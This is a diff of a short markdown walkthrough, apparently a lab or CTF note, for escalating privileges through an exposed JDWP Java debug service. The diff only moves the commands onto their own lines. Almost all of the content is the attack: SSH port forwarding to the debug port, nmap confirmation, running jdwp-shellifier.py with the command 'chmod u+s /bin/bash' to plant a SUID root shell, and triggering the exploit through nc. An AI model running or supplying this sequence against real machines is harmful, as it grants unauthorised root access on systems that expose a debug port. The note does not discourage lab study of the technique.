@@ -6,16 +6,26 @@
 
 ### STEPS:
 
-#### 1) ss -tulpn (Verify that the debug service is running on the target machine on port 8000 and 8005 tomcat service)
+#### 1) Verify that the debug service is running on the target machine on port 8000 and 8005 tomcat service
 
-#### 2) ssh -L 8888:127.0.0.1:8000 USER@TARGET_IP (If the service runs locally, do local port forwarding to have access to the service)
+    ss -tulpn 
 
-#### 3) sudo nmap -sC -sV -p 8888 127.0.0.1 (Verify that you have access to the service)
+#### 2) If the service runs locally, do local port forwarding to have access to the service
+
+    ssh -L 8888:127.0.0.1:8000 USER@TARGET_IP 
+
+#### 3) Verify that you have access to the service
+
+    sudo nmap -sC -sV -p 8888 127.0.0.1 
 
 #### 4) Download the exploit
 
-#### 5) python2 jdwp-shellifier.py -t 127.0.0.1 -p 8888 --cmd 'chmod u+s /bin/bash' (Run the exploit)
+#### 5) Run the exploit
 
-#### 6) Target session: nc localhost 8005 (Trigger a connection on target ssh session AFTER you run the exploit to trigger the RCE)
+    python2 jdwp-shellifier.py -t 127.0.0.1 -p 8888 --cmd 'chmod u+s /bin/bash' 
+
+#### 6) Target session: Trigger a connection on target ssh session AFTER you run the exploit to trigger the RCE
+
+    nc localhost 8005 
 
 #### 7) PWNED!
